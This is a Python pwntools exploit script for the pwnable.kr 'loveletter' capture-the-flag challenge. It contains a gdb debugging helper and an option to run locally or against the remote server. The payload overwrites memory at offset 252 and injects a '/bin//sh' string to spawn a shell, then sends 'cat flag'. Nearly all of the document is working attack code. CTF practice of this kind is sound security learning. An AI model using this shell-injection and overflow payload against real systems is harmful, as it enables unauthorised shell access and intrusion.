from pwn import *
import argh


ADDR = 'pwnable.kr'
PORT = 9034


def start_gdb(exe_name):
    return gdb.debug([exe_name], '''
    b *0x8048833
    b *0x804887e
    display/10wx $esp+0x100
    layout regs
    continue
    ''')


@argh.arg('--local', '-l', help='Run Locally')
@argh.arg('--runpwn', '-r', help='Run Remotly')
def main(local=False, runpwn=False):
    p = None
    bin_path = './loveletter'
    e = ELF(bin_path)

    if local:
        p = start_gdb(bin_path)
    elif runpwn:
        p = remote(ADDR, PORT)

    code = 'nv /bin//sh -s '
    puff_buf = '$' * 2
    wanted_num = 1
    payload = flat({0: code, len(code): puff_buf, 252:p32(1)})
    p.sendline(payload)
    p.sendline('cat flag')
    print(p.recvline())


if __name__ == '__main__':
    argh.dispatch_command(main)

